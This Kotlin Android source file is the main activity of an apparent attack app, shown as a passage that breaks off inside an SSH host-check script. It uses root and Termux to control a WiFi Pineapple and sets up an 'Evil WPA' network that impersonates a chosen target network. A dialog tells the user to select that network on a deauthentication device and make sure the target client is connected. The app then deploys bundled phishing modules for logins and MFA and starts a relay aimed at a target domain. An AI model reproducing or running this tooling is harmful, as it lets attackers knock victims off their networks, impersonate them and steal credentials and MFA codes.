package com.example.authrelayapp

import android.content.ActivityNotFoundException
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.text.method.ScrollingMovementMethod
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import android.os.PowerManager
import android.view.WindowManager
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

class MainActivity : AppCompatActivity() {

    private val TERMUX_HOME = "/data/data/com.termux/files/home"
    private val TERMUX_BASH = "/data/data/com.termux/files/usr/bin/bash"
    private val TERMUX_SSH = "/data/data/com.termux/files/usr/bin/ssh"
    private val TERMUX_SSH_KEYGEN = "/data/data/com.termux/files/usr/bin/ssh-keygen"
    private val TERMUX_SSHPASS = "/data/data/com.termux/files/usr/bin/sshpass"
    private val TERMUX_TIMEOUT = "/data/data/com.termux/files/usr/bin/timeout"
    private val TERMUX_SSH_KEY = "/data/data/com.termux/files/home/.ssh/pineapple"
    private val TERMUX_SSH_KEY_PUB = "/data/data/com.termux/files/home/.ssh/pineapple.pub"
    private var PINEAPPLE_IP = "172.16.52.1"
    private var deviceType = "Pager"
    private val SD_SCRIPT = "/sdcard/x11_start.sh"

    private var termuxUid: String = ""
    private var termuxGid: String = ""
    private var termuxGroups: String = ""

    private val isRunning = AtomicBoolean(false)
    private val currentStep = AtomicInteger(0)
    private var mainThread: Thread? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        val textView = findViewById<TextView>(R.id.textView)
        textView.movementMethod = ScrollingMovementMethod()

        val toggleButton = findViewById<Button>(R.id.button1)
        toggleButton.text = "START AUTO-SETUP"

        findViewById<Button>(R.id.button2).apply {
            visibility = android.view.View.GONE
        }
        findViewById<Button>(R.id.button3).apply {
            visibility = android.view.View.GONE
        }
        findViewById<Button>(R.id.button4).apply {
            visibility = android.view.View.GONE
        }

        detectTermuxIds()

        toggleButton.setOnClickListener {
            if (isRunning.get()) {
                isRunning.set(false)
                mainThread?.interrupt()
                toggleButton.text = "START AUTO-SETUP"
                textView.append("\n\n❌ Auto-setup stopped by user\n")
                Thread {
                    val stopCleanup = "ps -ef | grep -E 'geckodriver|firefox|main.py|com.termux.x11' | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true"
                    val stopCleanupProc = Runtime.getRuntime().exec(arrayOf("su", "-c", stopCleanup))
                    stopCleanupProc.waitFor()
                    val killPort9999Script = """
                        #!/data/data/com.termux/files/usr/bin/bash
                        export HOME=$TERMUX_HOME
                        export PREFIX=/data/data/com.termux/files/usr
                        export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                        $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP 'kill -9 ${'$'}(netstat -tlnp 2>/dev/null | grep :9999 | head -1 | grep -o "[0-9]*/sshd" | cut -d/ -f1) 2>/dev/null; true'
                    """.trimIndent()
                    val killPort9999Path = "/sdcard/kill_9999.sh"
                    writeFileAsRoot(killPort9999Path, killPort9999Script)
                    execAsRoot("chmod 644 $killPort9999Path")
                    val killPort9999Pipeline = "cat $killPort9999Path | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                    Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", killPort9999Pipeline)).waitFor()
                }.start()
            } else {
                isRunning.set(true)
                toggleButton.text = "STOP AUTO-SETUP"
                textView.text = "🚀 Starting automated setup...\n\n"

                Thread {
                    val startCleanup = "ps -ef | grep -E 'geckodriver|firefox|main.py|com.termux.x11' | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true"
                    val startCleanupProc = Runtime.getRuntime().exec(arrayOf("su", "-c", startCleanup))
                    startCleanupProc.waitFor()
                    Thread.sleep(2000)
                    mainThread = Thread {
                        runAutomatedSetup(textView, toggleButton)
                    }
                    mainThread?.start()
                }.start()
            }
        }
    }

    private fun promptForDeviceType(textView: TextView): Boolean {
        var result = false
        val latch = java.util.concurrent.CountDownLatch(1)
        var dialog: android.app.AlertDialog? = null

        runOnUiThread {
            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle("Select Device Type")
                .setMessage("Which device are you connecting to?")
                .setPositiveButton("Mark VII") { _, _ ->
                    deviceType = "Mark VII"
                    PINEAPPLE_IP = "172.16.42.1"
                    result = true
                    latch.countDown()
                }
                .setNegativeButton("Pager") { _, _ ->
                    deviceType = "Pager"
                    PINEAPPLE_IP = "172.16.52.1"
                    result = true
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog?.show()
        }

        Thread {
            while (latch.count > 0 && isRunning.get()) {
                Thread.sleep(100)
            }
            if (!isRunning.get()) {
                runOnUiThread { dialog?.dismiss() }
                latch.countDown()
            }
        }.start()

        latch.await()
        return result && isRunning.get()
    }

    private fun runAutomatedSetup(textView: TextView, toggleButton: Button) {
        try {
            appendLog(textView, "=== DEVICE SELECTION ===\n")
            val deviceSelected = promptForDeviceType(textView)
            if (!deviceSelected) {
                appendLog(textView, "❌ Device selection cancelled - setup aborted\n")
                runOnUiThread {
                    isRunning.set(false)
                    toggleButton.text = "START AUTO-SETUP"
                }
                return
            }
            appendLog(textView, "✅ Device: $deviceType ($PINEAPPLE_IP)\n\n")

            ensureTermuxIdsDetected()

            appendLog(textView, "=== DOMAIN CONFIGURATION ===\n")
            val domain = promptForDomain(textView)
            if (domain == null) {
                appendLog(textView, "❌ Domain input cancelled - setup aborted\n")
                runOnUiThread {
                    isRunning.set(false)
                    toggleButton.text = "START AUTO-SETUP"
                }
                return
            }

            saveDomain(domain)
            appendLog(textView, "✅ Target domain: $domain\n\n")

            if (!isRunning.get()) return
            currentStep.set(1)
            appendLog(textView, "=== STEP 1: CHECKING TERMUX INSTALLATION ===\n")
            var step1Success = false
            var attempt = 1
            while (!step1Success && isRunning.get() && currentStep.get() == 1) {
                appendLog(textView, "Attempt $attempt: Verifying Termux installation...\n")
                step1Success = checkTermuxInstallation(textView)
                if (!step1Success && isRunning.get() && currentStep.get() == 1) {
                    appendLog(textView, "⚠️ Retrying in 5 seconds...\n\n")
                    Thread.sleep(5000)
                    attempt++
                }
            }
            if (!isRunning.get() || currentStep.get() != 1) return
            appendLog(textView, "✅ Step 1 complete!\n\n")

            if (!isRunning.get()) return
            currentStep.set(2)
            appendLog(textView, "=== STEP 2: TESTING PINEAPPLE CONNECTION ===\n")
            var step2Success = false
            attempt = 1
            while (!step2Success && isRunning.get() && currentStep.get() == 2) {
                appendLog(textView, "Attempt $attempt: Testing connection to Pineapple...\n")
                step2Success = testPineappleConnection(textView)
                if (!step2Success && isRunning.get() && currentStep.get() == 2) {
                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    attempt++
                }
            }
            if (!isRunning.get() || currentStep.get() != 2) return
            appendLog(textView, "✅ Step 2 complete!\n\n")

            // Kill any stale port 9999 on the Pineapple now that we know the IP
            val killPort9999Script = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP 'kill -9 ${'$'}(netstat -tlnp 2>/dev/null | grep :9999 | head -1 | grep -o "[0-9]*/sshd" | cut -d/ -f1) 2>/dev/null; true'
            """.trimIndent()
            val killPort9999Path = "/sdcard/kill_9999.sh"
            writeFileAsRoot(killPort9999Path, killPort9999Script)
            execAsRoot("chmod 644 $killPort9999Path")
            val killPort9999Pipeline = "cat $killPort9999Path | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", killPort9999Pipeline)).waitFor()

            if (!isRunning.get()) return
            currentStep.set(3)
            appendLog(textView, "=== STEP 3: SETTING UP PREREQUISITES ===\n")
            var step3Success = false
            attempt = 1
            while (!step3Success && isRunning.get() && currentStep.get() == 3) {
                appendLog(textView, "Attempt $attempt: Setting up SSH keys and scripts...\n")
                step3Success = setupPrerequisites(textView)
                if (!step3Success && isRunning.get() && currentStep.get() == 3) {
                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    attempt++
                }
            }
            if (!isRunning.get() || currentStep.get() != 3) return
            appendLog(textView, "✅ Step 3 complete!\n\n")

            if (!isRunning.get()) return
            currentStep.set(4)
            appendLog(textView, "=== STEP 4: CONFIGURING EVIL WPA NETWORK ===\n")
            var step4Success = false
            attempt = 1
            while (!step4Success && isRunning.get() && currentStep.get() == 4) {
                appendLog(textView, "Attempt $attempt: Configuring target network settings...\n")
                step4Success = configureEvilWPA(textView)
                if (!step4Success && isRunning.get() && currentStep.get() == 4) {
                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    attempt++
                }
            }
            if (!isRunning.get() || currentStep.get() != 4) return
            appendLog(textView, "✅ Step 4 complete!\n\n")

            if (!isRunning.get()) return
            currentStep.set(5)
            appendLog(textView, "=== STEP 5: STARTING RELAY SERVICE ===\n")

            while (isRunning.get() && currentStep.get() == 5) {
                var step5Success = false
                attempt = 1

                while (!step5Success && isRunning.get() && currentStep.get() == 5) {
                    appendLog(textView, "Attempt $attempt: Starting relay service...\n")
                    step5Success = startRelayService(textView, domain)

                    if (!step5Success && isRunning.get() && currentStep.get() == 5) {
                        appendLog(textView, "⚠️ Retrying in 15 seconds...\n\n")
                        Thread.sleep(15000)
                        attempt++
                    }
                }

                if (!isRunning.get() || currentStep.get() != 5) break

                appendLog(textView, "\n" + "=".repeat(50) + "\n")
                appendLog(textView, "✅ RELAY SERVICE STARTED SUCCESSFULLY!\n")
                appendLog(textView, "📊 Now monitoring Python output...\n")
                appendLog(textView, "Press STOP to terminate monitoring.\n")
                appendLog(textView, "=".repeat(50) + "\n\n")

                val monitorResult = monitorPythonOutputWithHealthCheck(textView)

                if (!isRunning.get() || currentStep.get() != 5) break

                if (monitorResult == MonitorResult.DNS_ERROR || monitorResult == MonitorResult.SERVICE_FAILED) {
                    val backoffSeconds = minOf(60 * attempt, 300) // cap at 5 minutes
                    appendLog(textView, "\n⚠️ Service failure detected! Restarting in ${backoffSeconds} seconds...\n\n")
                    Thread.sleep(backoffSeconds * 1000L)
                    appendLog(textView, "=== RESTARTING STEP 5: RELAY SERVICE ===\n")
                    attempt++
                } else {
                    break
                }
            }

        } catch (e: InterruptedException) {
            appendLog(textView, "\n⚠️ Setup interrupted by user\n")
        } catch (e: Exception) {
            appendLog(textView, "\n❌ Fatal error: ${e.message}\n${e.stackTraceToString()}")
        } finally {
            runOnUiThread {
                isRunning.set(false)
                toggleButton.text = "START AUTO-SETUP"
            }
            currentStep.set(0)
        }
    }

    enum class MonitorResult {
        USER_STOPPED,
        DNS_ERROR,
        SERVICE_FAILED,
        UNKNOWN_ERROR
    }

    private fun configureEvilWPA(textView: TextView): Boolean {
        try {
            appendLog(textView, "=== TARGET NETWORK CONFIGURATION ===\n")

            appendLog(textView, "⚙️ Detecting Evil Portal interface...\n")
            val detectScript = if (deviceType == "Mark VII") {
                """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP \
                    'uci show wireless.@wifi-iface[3].network 2>/dev/null | grep -q "evil" && echo "IFACE:wlan0-3" || echo "IFACE:wlan0"'
                """.trimIndent()
            } else {
                """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP \
                    'uci show wireless.wlan0wpa.network 2>/dev/null | grep -q "evil" && echo "IFACE:wlan0wpa" || uci show wireless.wlan0open.network 2>/dev/null | grep -q "evil" && echo "IFACE:wlan0open" || echo "IFACE:br-lan"'
                """.trimIndent()
            }

            val detectPath = "/sdcard/detect_evil_iface.sh"
            writeFileAsRoot(detectPath, detectScript)
            execAsRoot("chmod 644 $detectPath")

            val detectPipeline = "cat $detectPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val detectProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", detectPipeline))
            val detectOutput = BufferedReader(InputStreamReader(detectProc.inputStream)).use { it.readText() }.trim()
            detectProc.waitFor()

            val evilInterface = when {
                detectOutput.contains("IFACE:wlan0-3")   -> "wlan0-3"
                detectOutput.contains("IFACE:wlan0wpa")  -> "wlan0wpa"
                detectOutput.contains("IFACE:wlan0open") -> "wlan0open"
                detectOutput.contains("IFACE:wlan0")     -> "wlan0"
                else                                      -> "br-lan"
            }

            appendLog(textView, "✅ Evil Portal interface detected: $evilInterface\n")

            val userConfirmed = showNetworkSelectionReminder(textView)
            if (!userConfirmed) {
                appendLog(textView, "❌ User cancelled network selection reminder\n")
                return false
            }

            appendLog(textView, "✅ User confirmed target network is selected\n")

            val networkCredentials = promptForNetworkCredentials(textView, evilInterface)
            if (networkCredentials == null) {
                appendLog(textView, "❌ Network credentials input cancelled\n")
                return false
            }

            val (ssid, passphrase) = networkCredentials
            appendLog(textView, "✅ Target SSID: $ssid\n")
            appendLog(textView, "⚙️ Configuring $evilInterface on $deviceType...\n")

            val escapedSsid = ssid.replace("'", "'\\''")
            val escapedPassphrase = passphrase.replace("'", "'\\''")

            val remoteScriptContent = when (evilInterface) {
                "wlan0wpa" ->
                    "uci revert wireless.wlan0wpa\nuci set wireless.wlan0wpa.ssid='${escapedSsid}'\nuci set wireless.wlan0wpa.key='${escapedPassphrase}'\nuci set wireless.wlan0wpa.disabled=0\nwifi reload\n"
                "wlan0open" ->
                    "uci revert wireless.wlan0open\nuci set wireless.wlan0open.ssid='${escapedSsid}'\nuci set wireless.wlan0open.disabled=0\nwifi reload\n"
                "wlan0-3" ->
                    "uci revert wireless.@wifi-iface[3]\nuci set wireless.@wifi-iface[3].ssid='${escapedSsid}'\nuci set wireless.@wifi-iface[3].key='${escapedPassphrase}'\nuci set wireless.@wifi-iface[3].disabled=0\nwifi reload\n"
                "wlan0" ->
                    "uci revert wireless.@wifi-iface[0]\nuci set wireless.@wifi-iface[0].ssid='${escapedSsid}'\nuci set wireless.@wifi-iface[0].disabled=0\nwifi reload\n"
                else -> {
                    appendLog(textView, "❌ Unexpected interface: $evilInterface\n")
                    return false
                }
            }

            val remotePath = "$TERMUX_HOME/remote_wpa.sh"
            writeFileAsRoot(remotePath, remoteScriptContent)
            execAsRoot("chown $termuxUid:$termuxGid $remotePath")
            execAsRoot("chmod 644 $remotePath")

            val configScript = """
            #!/data/data/com.termux/files/usr/bin/bash
            export HOME=$TERMUX_HOME
            export PREFIX=/data/data/com.termux/files/usr
            export PATH="${'$'}PREFIX/bin:${'$'}PATH"
            cd "$TERMUX_HOME"

            cat $remotePath | $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP 'cat > /tmp/wpa_setup.sh'
            $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP 'sh /tmp/wpa_setup.sh; rm -f /tmp/wpa_setup.sh'

            exit ${'$'}?
            """.trimIndent()

            val configPath = "/sdcard/configure_evil_wpa.sh"
            writeFileAsRoot(configPath, configScript)
            execAsRoot("chmod 644 $configPath")

            val pipeline = "cat $configPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val exitCode = proc.waitFor()

            if (exitCode == 0) {
                appendLog(textView, "✅ $evilInterface configured successfully\n")
                appendLog(textView, "✅ WiFi reload triggered on $deviceType\n")
                appendLog(textView, "⏳ Waiting for WiFi to stabilize...\n")
                Thread.sleep(10000)

                appendLog(textView, "🔍 Verifying WiFi configuration was applied...\n")
                val maxVerifyAttempts = 5
                var verified = false

                for (attempt in 1..maxVerifyAttempts) {
                    if (!isRunning.get()) return false

                    appendLog(textView, "Attempt $attempt: Checking host reachability...\n")
                    val pingProc = Runtime.getRuntime().exec(
                        arrayOf("su", termuxUid, "-c", "timeout 15 ping -c 4 $PINEAPPLE_IP")
                    )
                    val pingExit = pingProc.waitFor()

                    if (pingExit != 0) {
                        appendLog(textView, "⚠️ Host not reachable, retrying in 10 seconds...\n")
                        Thread.sleep(10000)
                        continue
                    }

                    val uciCheckScript = """
                        #!/data/data/com.termux/files/usr/bin/bash
                        export HOME=$TERMUX_HOME
                        export PREFIX=/data/data/com.termux/files/usr
                        export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                        $TERMUX_SSH -i $TERMUX_SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@$PINEAPPLE_IP \
                            'uci changes wireless' 2>/dev/null
                    """.trimIndent()

                    val uciCheckPath = "/sdcard/uci_check.sh"
                    writeFileAsRoot(uciCheckPath, uciCheckScript)
                    execAsRoot("chmod 644 $uciCheckPath")

                    val uciPipeline = "cat $uciCheckPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                    val uciProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", uciPipeline))
                    val uciOutput = BufferedReader(InputStreamReader(uciProc.inputStream)).use { it.readText() }.trim()
                    uciProc.waitFor()

                    appendLog(textView, "UCI changes: $uciOutput\n")

                    if (uciOutput.contains("ssid='$ssid'") || uciOutput.contains("ssid=\"$ssid\"")) {
                        appendLog(textView, "✅ WiFi configuration verified — SSID '$ssid' confirmed in uci changes\n")
                        verified = true
                        break
                    } else {
                        appendLog(textView, "⚠️ SSID not yet visible in uci changes, retrying in 10 seconds...\n")
                        Thread.sleep(10000)
                    }
                }

                if (!verified) {
                    appendLog(textView, "❌ WiFi configuration could not be verified after $maxVerifyAttempts attempts\n")
                    return false
                }

                saveNetworkCredentials(ssid, passphrase)
                return true
            } else {
                appendLog(textView, "❌ Failed to configure $evilInterface (exit code: $exitCode)\n")
                return false
            }

        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun showNetworkSelectionReminder(textView: TextView): Boolean {
        var result = false
        val latch = java.util.concurrent.CountDownLatch(1)
        var dialog: android.app.AlertDialog? = null

        runOnUiThread {
            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle("⚠️ Important Reminder")
                .setMessage("Before continuing:\n\n" +
                        "1. Identify the TARGET NETWORK you want to impersonate\n" +
                        "2. Select the TARGET NETWORK on your deauthentication device\n" +
                        "3. Ensure the target client is connected to the TARGET NETWORK\n\n" +
                        "Click OK once you have completed the above.")
                .setPositiveButton("OK") { _, _ ->
                    result = true
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    result = false
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog?.show()
        }

        Thread {
            while (latch.count > 0 && isRunning.get()) {
                Thread.sleep(100)
            }
            if (!isRunning.get()) {
                runOnUiThread { dialog?.dismiss() }
                latch.countDown()
            }
        }.start()

        latch.await()
        return result && isRunning.get()
    }

    private fun checkTermuxInstallation(textView: TextView): Boolean {
        try {
            try {
                val rootProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
                val rootOutput = BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
                val rootExit = rootProc.waitFor()

                if (rootExit != 0) {
                    appendLog(textView, "❌ Root access not available\n")
                    return false
                }
                appendLog(textView, "✅ Root access confirmed\n")
            } catch (e: Exception) {
                appendLog(textView, "❌ Root check failed: ${e.message}\n")
                return false
            }

            val (success, errorMsg) = ensureTermuxIdsDetected()
            if (!success) {
                appendLog(textView, "❌ Termux not detected: $errorMsg\n")
                return false
            }
            appendLog(textView, "✅ Termux detected (UID: $termuxUid)\n")

            val x11Proc = Runtime.getRuntime()
                .exec(arrayOf("su", "-c", "grep com.termux.x11 /data/system/packages.list"))
            val x11Exit = x11Proc.waitFor()

            if (x11Exit != 0) {
                appendLog(textView, "❌ Termux:X11 not found\n")
                return false
            }
            appendLog(textView, "✅ Termux:X11 detected\n")

            return true
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun testPineappleConnection(textView: TextView): Boolean {
        try {
            try {
                val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                    ?: Intent().apply {
                        setClassName("com.termux", "com.termux.app.TermuxActivity")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                startActivity(termuxLaunch)
                Thread.sleep(2000)
                val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                }
                startActivity(returnIntent)
                Thread.sleep(500)
            } catch (e: Exception) {
                appendLog(textView, "⚠️ Could not launch Termux: ${e.message}\n")
            }

            val proc = Runtime.getRuntime().exec(
                arrayOf("su", termuxUid, "-c", "timeout 15 ping -c 4 $PINEAPPLE_IP")
            )

            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            val exitCode = proc.waitFor()

            if (exitCode == 0) {
                appendLog(textView, "✅ Pineapple is reachable at $PINEAPPLE_IP\n")
                return true
            } else if (exitCode == 124) {
                appendLog(textView, "❌ Connection timed out after 15 seconds\n")
                return false
            } else {
                appendLog(textView, "❌ Pineapple is not reachable (exit: $exitCode)\n")
                return false
            }
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun setupPrerequisites(textView: TextView): Boolean {
        try {
            val checkScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "$TERMUX_HOME"
                if [ -f $TERMUX_SSH_KEY ]; then
                    echo 'SSH_KEY:EXISTS'
                else
                    echo 'SSH_KEY:MISSING'
                fi
                if [ -f $TERMUX_SSH_KEY_PUB ]; then
                    echo 'SSH_KEY_PUB:EXISTS'
                else
                    echo 'SSH_KEY_PUB:MISSING'
                fi
            """.trimIndent()

            val checkScriptPath = "/sdcard/check_prereqs.sh"
            writeFileAsRoot(checkScriptPath, checkScript)
            execAsRoot("chmod 644 $checkScriptPath")

            val checkPipeline = "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
            val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
            checkProc.waitFor()

            val sshKeyExists    = checkOutput.contains("SSH_KEY:EXISTS")
            val sshKeyPubExists = checkOutput.contains("SSH_KEY_PUB:EXISTS")

            var needToTransferKey = false

            if (!sshKeyExists) {
                appendLog(textView, "📝 Generating SSH key pair...\n")
                val keygenSuccess = generateSshKeyPair(textView)
                if (!keygenSuccess) {
                    appendLog(textView, "❌ Failed to generate SSH key\n")
                    return false
                }
                appendLog(textView, "✅ SSH key pair generated\n")
                needToTransferKey = true

                val password = promptForPassword(textView, "SSH Password Required",
                    "Enter SSH password for root@$PINEAPPLE_IP to transfer the newly generated key:")

                if (password == null) {
                    appendLog(textView, "❌ Password input cancelled\n")
                    return false
                }

                appendLog(textView, "⚙️ Transferring public key to Pineapple...\n")
                val transferSuccess = transferKeyWithPasswordAndRegenerate(password, textView)
                if (!transferSuccess) {
                    appendLog(textView, "❌ Failed to transfer SSH key\n")
                    return false
                }
                appendLog(textView, "✅ SSH key transferred successfully\n")
                needToTransferKey = false
            } else {
                appendLog(textView, "✅ SSH key already exists\n")
            }

            // Write all Python modules
            val scripts = mapOf(
                "main.py"            to R.raw.main_py,
                "server.py"          to R.raw.server_py,
                "login_handler.py"   to R.raw.login_handler_py,
                "mfa_handler.py"     to R.raw.mfa_handler_py,
                "result_notifier.py" to R.raw.result_notifier_py,
                "domain_utils.py"    to R.raw.domain_utils_py,
                "utils.py"           to R.raw.utils_py,
                "phishlet.py"        to R.raw.phishlet_py,
            )

            for ((filename, resourceId) in scripts) {
                val filePath = "$TERMUX_HOME/$filename"
                appendLog(textView, "📥 Writing bundled $filename...\n")
                try {
                    val content = resources.openRawResource(resourceId)
                        .bufferedReader(Charsets.UTF_8)
                        .use { it.readText() }
                    writeFileAsRoot(filePath, content)
                    execAsRoot("chown $termuxUid:$termuxGid $filePath")
                    execAsRoot("chmod 755 $filePath")
                    appendLog(textView, "✅ $filename written from bundle\n")
                } catch (e: Exception) {
                    appendLog(textView, "❌ Failed to write $filename: ${e.message}\n")
                    return false
                }
            }

            if (!needToTransferKey) {
                appendLog(textView, "🔑 Verifying SSH host key...\n")

                execAsRoot("chown $termuxUid:$termuxGid $TERMUX_HOME/.ssh/known_hosts 2>/dev/null || true")
                execAsRoot("chmod 600 $TERMUX_HOME/.ssh/known_hosts 2>/dev/null || true")
                execAsRoot("chown $termuxUid:$termuxGid $TERMUX_HOME/.ssh 2>/dev/null || true")
                execAsRoot("chmod 700 $TERMUX_HOME/.ssh 2>/dev/null || true")

                val hostCheckScript = """
                    #!/data/data/com.termux/files/usr/bin/bash
                    set +e

                    export HOME=$TERMUX_HOME
                    export PREFIX=/data/data/com.termux/files/usr
                    export PATH="${'$'}PREFIX/bin:${'$'}PATH"

                    cd "$TERMUX_HOME"

                    DEBUG=$TERMUX_HOME/hostcheck_debug.txt
                    exec > "${'$'}DEBUG" 2>&1
                    set -x

                    HOST=$PINEAPPLE_IP
                    ERR1=$TERMUX_HOME/ssh_err_1.txt
                    ERR2=$TERMUX_HOME/ssh_err_2.txt
                    ERR3=$TERMUX_HOME/ssh_err_3.txt
                    rm -f "${'$'}ERR1" "${'$'}ERR2" "${'$'}ERR3"

                    echo 'HOSTCHECK:START'

                    status1=0
                    $TERMUX_TIMEOUT 10 $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>"${'$'}ERR1" || status1=${'$'}?

                    if [ ${'$'}status1 -eq 0 ]; then
                      echo 'HOSTKEY_FAILED:NO'
                      echo 'PUBKEY_FAILED:NO'
                      echo 'HOSTKEY_REMOVED:NO'
                      echo 'NEW_CONNECTION_OK:YES'
                      echo 'HOSTCHECK:END'
                      rm -f "${'$'}ERR1" "${'$'}ERR2" "${'$'}ERR3"
                      exit 0
                    fi

                    if grep -qiE 'host key verification failed|REMOTE HOST IDENTIFICATION HAS CHANGED|No ED25519 host key is known' "${'$'}ERR1"; then
                      echo 'HOSTKEY_FAILED:YES'
                      if grep -qiE 'Permission denied.*publickey' "${'$'}ERR1"; then
                        echo 'PUBKEY_FAILED:YES'
                      else
                        echo 'PUBKEY_FAILED:NO'
                      fi
                      $TERMUX_SSH_KEYGEN -R "${'$'}HOST" >/dev/null 2>&1 || true
                      echo 'HOSTKEY_REMOVED:YES'
                      $TERMUX_TIMEOUT 10 $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>"${'$'}ERR2" || true
                      chmod 600 $TERMUX_HOME/.ssh/known_hosts 2>/dev/null || true
                      status3=0
                      $TERMUX_TIMEOUT 10 $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>"${'$'}ERR3" || status3=${'$'}?
                      if [ ${'$'}status3 -eq 0 ]; then
                        echo 'NEW_CONNECTION_OK:YES'
                      else
                        echo 'NEW_CONNECTION_OK:NO'
                      fi
                    else
                      if grep -qiE 'Permission denied.*publickey' "${'$'}ERR1"; then
                        echo 'HOSTKEY_FAILED:NO'
                        echo 'PUBKEY_FAILED:YES'
                        echo 'HOSTKEY_REMOVED:NO'
                        echo 'NEW_CONNECTION_OK:NO'
                      else
                        echo 'HOSTKEY_FAILED:NO'
                        echo 'PUBKEY_FAILED:NO'
                        echo 'HOSTKEY_REMOVED:NO'
                        $TERMUX_TIMEOUT 10 $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>"${'$'}ERR2" || true
                        chmod 600 $TERMUX_HOME/.ssh/known_hosts 2>/dev/null || true
                        status3=0
                        $TERMUX_TIMEOUT 10 $TERMUX_SSH -i $TERMUX_SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>"${'$'}ERR3" || status3=${'$'}?
                        if [ ${'$'}status3 -eq 0 ]; then
                          echo 'NEW_CONNECTION_OK:YES'
                        else
                          echo 'NEW_CONNECTION_OK:NO'
                        fi
                      fi
                    fi

